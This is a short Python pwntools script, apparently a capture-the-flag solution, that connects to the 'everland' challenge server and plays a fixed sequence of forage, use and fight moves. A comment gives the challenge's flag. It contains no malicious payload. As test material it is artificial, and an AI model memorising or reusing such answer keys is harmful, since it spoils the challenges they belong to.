#!/usr/bin/env python
from pwn import *

# PCTF{just_be_glad_i_didnt_arm_cpt_hook_with_GADTs}

host , port = 'everland.pwni.ng' , 7772
y = remote( host , port )


def sp( p ):
    y.sendlineafter( '>' , p )

y.sendlineafter( '?' , 'yuawn' )

for _ in range( 5 ):
   sp( 'forage' )

sp( 'use' )
sp( '1' )

sp( 'use' )
sp( '3' )

for _ in range( 3 ):
    sp( 'fight' )
    sp( '2' )

sp( 'fight' )
sp( '4' )

sp( 'fight' )
sp( '4' )
for j in range( 9 ):
    sp( 'fight' )
    sp( '2' )

for i in range( 8 ):
    sp( 'fight' )
    sp( '4' )
    for j in range( 7 ):
        sp( 'fight' )
        sp( '2' )


sp( 'fight' )
sp( '5' )

y.interactive()